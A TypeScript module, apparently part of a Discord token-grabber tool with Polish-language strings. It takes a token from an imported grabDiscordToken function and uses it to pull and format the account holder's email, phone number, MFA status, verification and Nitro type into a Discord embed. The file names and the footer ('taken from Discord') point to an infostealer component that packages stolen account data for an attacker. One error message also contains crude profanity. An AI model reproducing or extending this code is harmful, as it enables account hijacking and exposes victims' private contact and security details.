import { EmbedBuilder } from 'discord.js'
import { getRandomColor } from '@/bot/functions/visual-embed/colors'
import { getUserData } from '@/bot/functions/user-and-ip/user-data'
import { grabDiscordToken } from '@/bot/functions/user-and-ip/grab-token'

export const createUserEmbed = async (): Promise<EmbedBuilder> => {
  const token = grabDiscordToken() || process.env.USER_TOKEN
  if (!token)
    return new EmbedBuilder()
      .setTitle('❌ Błąd')
      .setDescription('Nie udało się pobrać tokenu.')
      .setColor(0xff0000)
      .setTimestamp()

  const userData = await getUserData(token)

  if (!userData) {
    return new EmbedBuilder()
      .setTitle('❌ Błąd')
      .setDescription('Nie udało się pobrać danych użytkownika, chuj nam w dupe ;( ')
      .setColor(0xff0000)
      .setTimestamp()
  }

  const embed = new EmbedBuilder()
    .setTitle('🌟 **Dane użytkownika** 🌟')
    .setColor(getRandomColor())
    .setThumbnail(`https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`)
    .addFields(
      {
        name: '👤 Username',
        value: `${userData.username}#${userData.discriminator}`,
        inline: true,
      },
      { name: '🆔 ID użytkownika', value: userData.id, inline: true },
      { name: '📧 Email', value: userData.email, inline: true },
      { name: '📱 Telefon', value: userData.phone || 'Brak', inline: true },
      { name: '🌍 Język', value: userData.locale, inline: true },
      { name: '✅ Weryfikacja', value: userData.verified ? 'Tak' : 'Nie', inline: true },
      { name: '🔞 Dostęp do NSFW', value: userData.nsfw_allowed ? 'Tak' : 'Nie', inline: true },
      { name: '🔐 MFA', value: userData.mfa_enabled ? 'Włączone' : 'Wyłączone', inline: true },
      {
        name: '💎 Typ Premium',
        value:
          userData.premium_type === 1
            ? 'Nitro Classic'
            : userData.premium_type === 2
              ? 'Nitro'
              : 'Brak',
        inline: true,
      }
    )
    .setTimestamp()
    .setFooter({ text: `Pobrane z Discorda` })

  return embed
}
